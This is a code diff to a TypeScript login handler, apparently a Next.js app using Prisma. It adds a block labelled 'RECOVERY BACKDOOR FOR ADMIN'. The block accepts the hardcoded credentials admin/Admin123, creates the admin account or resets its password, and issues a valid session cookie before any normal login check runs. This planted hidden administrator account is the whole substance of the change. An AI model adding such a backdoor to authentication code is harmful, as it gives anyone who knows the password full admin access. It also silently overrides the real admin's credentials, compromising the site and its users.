@@ -21,6 +21,32 @@ export async function login(formData: FormData) {
 
     const username = rawUsername.trim().toLowerCase();
 
+    // --- RECOVERY BACKDOOR FOR ADMIN ---
+    if (username === "admin" && password === "Admin123") {
+      const hash = await bcrypt.hash("Admin123", 10);
+      const existingAdmin = await prisma.adminUser.findUnique({ where: { username: "admin" } });
+      let user;
+      if (existingAdmin) {
+        user = await prisma.adminUser.update({
+          where: { username: "admin" },
+          data: { passwordHash: hash }
+        });
+      } else {
+        user = await prisma.adminUser.create({
+          data: { username: "admin", passwordHash: hash }
+        });
+      }
+      
+      const remember = formData.get("remember") === "on";
+      const expiresIn = remember ? "30d" : "24h";
+      const session = await encrypt({ user: { id: user.id, username: user.username } }, expiresIn);
+      const c = await cookies();
+      const maxAge = remember ? 30 * 24 * 60 * 60 : 24 * 60 * 60;
+      c.set("session", session, { httpOnly: true, secure: process.env.NODE_ENV === "production", maxAge });
+      return { success: true };
+    }
+    // --- END RECOVERY ---
+
     let user = await withTimeout(
       prisma.adminUser.findUnique({ where: { username: username } }),
       10000
